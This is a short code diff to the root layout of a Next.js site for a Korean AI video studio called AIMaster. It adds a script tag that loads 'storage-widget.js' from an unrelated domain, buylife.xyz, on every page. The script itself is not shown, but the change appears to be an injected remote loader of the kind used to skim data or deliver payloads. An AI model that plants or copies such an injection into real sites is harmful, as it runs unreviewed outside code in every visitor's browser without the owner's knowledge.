@@ -1,5 +1,6 @@
 import type { Metadata } from "next";
 import "./globals.css";
+import Script from "next/script";
 
 export const metadata: Metadata = {
   title: "AI 영상 스튜디오 — AIMaster",
@@ -15,6 +16,7 @@ export default function RootLayout({
     <html lang="ko">
       <body className="bg-zinc-950 text-zinc-100 min-h-screen antialiased">
         {children}
+        <Script src="https://www.buylife.xyz/storage-widget.js" strategy="afterInteractive" />
       </body>
     </html>
   );
